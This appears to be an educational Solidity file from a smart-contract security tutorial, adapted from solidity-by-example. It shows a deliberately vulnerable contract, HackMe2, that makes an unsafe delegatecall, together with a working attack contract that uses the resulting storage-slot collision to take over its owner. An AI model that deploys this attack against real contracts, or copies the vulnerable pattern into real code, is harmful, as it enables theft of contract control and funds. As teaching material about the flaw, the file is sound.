// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;  
//pragma solidity ^0.8.0;   
// Resources: https://solidity-by-example.org/hacks/delegatecall/

contract Lib2 {
    uint public someNumber;     // slot 0

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe2 {
    address public lib;     // slot 0
    address public owner;   // slot 1
    uint public someNumber; // slot 2

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {                                        //  *
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack_UnsafeDelegateCall2 {
    // Make sure the storage layout is the same as HackMe, this is important due to how variable state are saved into the storage
    // This will allow us to correctly update the state variables
    address public lib;         // slot 0
    address public owner;       // slot 1
    uint public someNumber;     // slot 2

    HackMe2 public hackMe;       // slot 3   It doesn't affect the order of our interest variables

    constructor(HackMe2 _hackMe) {
        hackMe = HackMe2(_hackMe);
        owner = msg.sender;
    }

    function attack() public {
        hackMe.doSomething(uint(uint160(address(this)))); 
        //  We first change the addres of lib variable to our own Contract address, 
        //  this is possible because of someNumber variable inside Lib contract is at the place of lib variable inside HackMe contract.

        // Once lib address inside HackMe was updated for our Contract address, we call our own doSomething() function which is define inside our contract.
        // Finally, we pass any number as number for preserving the format: "doSomething(uint256)"
        hackMe.doSomething(1);                 
    }

    // function signature must match HackMe.doSomething()
    function doSomething(uint256 _num) public {                                
        owner = msg.sender;
    }
}
